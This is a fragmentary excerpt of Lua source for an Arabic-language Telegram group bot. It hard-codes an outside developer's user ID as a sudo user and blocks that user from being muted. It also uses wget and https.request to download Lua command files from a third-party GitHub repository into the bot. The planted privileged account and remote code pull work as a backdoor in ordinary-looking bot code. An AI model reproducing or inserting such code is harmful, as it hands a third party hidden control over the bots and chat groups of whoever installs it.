...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/bsbsbsb/tt/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1859346570,000000000000000000,7777777777777777777777,4444444444444444444}   
...
os.execute('wget https://raw.githubusercontent.com/bsbsbsb/ZX/main/DRAGON.lua')
...
tdcli_function ({ID = "GetUser",user_id_ = 1859346570,},function(arg,result) 
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '𓌹 ᯓ المبرج بويكا ★ 𓌺\n['..result.first_name_..'](t.me/ALEX_EL_KABEER)\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
...
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = 1859346570, offset_ = 0, limit_ = 1 }, taha, nil)
end,nil)
end
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بويكا مبرمج السورس',url="t.me/ALEX_EL_KABEER"}},
{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
}
local msg_id = msg.id_/2097152/0.5
...
if tonumber(userid) == tonumber(1859346570) then  
send(msg.chat_id_, msg.id_, "لا يجوز كتم بويكا عام لانه هكر 🌚😹")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/bsbsbsb/tt/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/bsbsbsb/tt/main/File_Bot/"..file)
if res == 200 then
